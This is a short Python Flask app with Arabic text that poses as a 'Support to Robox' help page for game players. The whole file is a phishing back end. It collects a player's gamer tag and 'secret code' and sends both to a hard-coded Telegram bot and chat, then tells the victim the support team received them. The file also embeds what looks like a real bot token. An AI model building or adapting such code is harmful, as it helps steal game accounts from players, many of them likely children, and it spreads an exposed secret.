import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# بيانات البوت الخاصة بك
BOT_TOKEN = "9180804627:AAEjgov9nzXgV_Wtvun7I4rkLg2wOn4Dp4s"
CHAT_ID = "6517028407"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/send-support", methods=["POST"])
def send_support():
    data = request.get_json(silent=True) or {}
    gamer_tag = (data.get("gamer_tag") or "").strip()
    secret_code = (data.get("secret_code") or "").strip()

    if not gamer_tag or not secret_code:
        return jsonify({"ok": False, "message": "من فضلك أدخل جميل والرمز أولاً!"}), 400

    if len(gamer_tag) > 100 or len(secret_code) > 50:
        return jsonify({"ok": False, "message": "البيانات المدخلة طويلة جداً."}), 400

    text = (
        "🎮 *طلب دعم جديد - Support to Robox*\n\n"
        f"👤 *جميل (الاسم):* `{gamer_tag}`\n"
        f"🔑 *الرمز:* `{secret_code}`"
    )

    tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        resp = requests.post(
            tg_url,
            json={
                "chat_id": CHAT_ID,
                "text": text,
                "parse_mode": "Markdown"
            },
            timeout=10
        )
        result = resp.json()
        if resp.ok and result.get("ok"):
            return jsonify({"ok": True, "message": "تم إرسال بياناتك بنجاح لفريق Support to Robox! 🚀"})
        return jsonify({"ok": False, "message": "تعذر الإرسال إلى تليجرام، حاول لاحقاً."}), 502
    except requests.RequestException:
        return jsonify({"ok": False, "message": "خطأ في الاتصال بالسيرفر."}), 502

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
    